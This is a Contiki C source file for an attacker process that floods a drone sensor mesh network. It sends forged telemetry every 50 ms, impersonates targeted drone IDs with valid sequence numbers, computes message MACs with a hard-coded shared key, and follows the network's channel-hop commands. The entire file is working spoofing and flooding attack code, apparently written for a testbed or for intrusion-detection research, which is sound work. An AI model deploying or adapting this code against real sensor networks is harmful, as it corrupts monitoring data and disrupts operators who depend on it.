#include "contiki.h"
#include "net/rime/mesh.h"
#include "lib/random.h"
#include "attack_targeting.h"
#include <stdio.h>
#include <string.h>

#define RADIO_CHANNEL_START 129
#define RADIO_CHANNEL_COUNT 4

#define MSG_VER 1
#define CTRL_CMD_HOP 1

#define MAC_KEY 0x6a09e667u

#define FLOOD_INTERVAL_MS 50

PROCESS(attacker_flood_proc, "Attacker flood");
AUTOSTART_PROCESSES(&attacker_flood_proc);

typedef struct {
  uint8_t ver;
  uint8_t drone_id;
  uint16_t seq;
  uint16_t temp;
  uint16_t vib;
  uint16_t gas;
  uint16_t batt_mv;
  uint32_t t;
  uint32_t mac;
} sensor_msg_t;

typedef struct {
  uint8_t ver;
  uint8_t cmd;
  uint8_t channel;
  uint8_t reserved;
  uint32_t t;
  uint32_t mac;
} control_msg_t;

static uint8_t current_channel = RADIO_CHANNEL_START;
static uint8_t channel_index = 0;
static const uint8_t channel_list[RADIO_CHANNEL_COUNT] = {129, 130, 131, 132};
static const linkaddr_t sink_addr = {{1, 0}};

static void recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops);
static const struct mesh_callbacks mesh_cb = { recv_mesh, NULL, NULL };
static struct mesh_conn mesh;

static void send_flood_to_target(attack_target_t *target, void *ctx);

static uint32_t
mac_fnv1a(const void *data, size_t len)
{
  const uint8_t *p = (const uint8_t *)data;
  uint32_t h = 2166136261u;
  uint32_t key = MAC_KEY;
  int i;
  for(i = 0; i < 4; i++) {
    h ^= (uint8_t)(key & 0xff);
    h *= 16777619u;
    key >>= 8;
  }
  for(size_t j = 0; j < len; j++) {
    h ^= p[j];
    h *= 16777619u;
  }
  return h;
}

static void
set_channel(uint8_t ch)
{
  if(ch == current_channel) {
    return;
  }
  mesh_close(&mesh);
  current_channel = ch;
  mesh_open(&mesh, current_channel, &mesh_cb);
}

static void
recv_mesh(struct mesh_conn *c, const linkaddr_t *from, uint8_t hops)
{
  control_msg_t ctrl;
  (void)c;
  (void)from;
  (void)hops;

  if(packetbuf_datalen() != sizeof(ctrl)) {
    return;
  }

  memcpy(&ctrl, packetbuf_dataptr(), sizeof(ctrl));
  if(ctrl.ver != MSG_VER || ctrl.cmd != CTRL_CMD_HOP) {
    return;
  }

  uint32_t mac = ctrl.mac;
  ctrl.mac = 0;
  if(mac != mac_fnv1a(&ctrl, sizeof(ctrl))) {
    return;
  }

  set_channel(ctrl.channel);
}

PROCESS_THREAD(attacker_flood_proc, ev, data)
{
  static struct etimer timer;

  PROCESS_EXITHANDLER(attack_targets_shutdown(););
  PROCESS_BEGIN();

  current_channel = channel_list[channel_index % RADIO_CHANNEL_COUNT];
  mesh_open(&mesh, current_channel, &mesh_cb);
  attack_targets_init();
  etimer_set(&timer, (CLOCK_SECOND * FLOOD_INTERVAL_MS) / 1000);

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&timer));
    attack_targets_for_each(send_flood_to_target, NULL);

    etimer_reset(&timer);
  }

  PROCESS_END();
}

static void
send_flood_to_target(attack_target_t *target, void *ctx)
{
  sensor_msg_t msg;
  (void)ctx;

  msg.ver = MSG_VER;
  msg.drone_id = target->drone_id;
  msg.seq = attack_target_next_seq(target);
  msg.t = clock_seconds();
  msg.temp = 25 + (random_rand() % 5);
  msg.vib = 50 + (random_rand() % 20);
  msg.gas = 80 + (random_rand() % 20);
  msg.batt_mv = 4100;
  msg.mac = 0;
  msg.mac = mac_fnv1a(&msg, sizeof(msg));

  set_channel(target->channel);
  packetbuf_copyfrom(&msg, sizeof(msg));
  mesh_send(&mesh, &sink_addr);
}
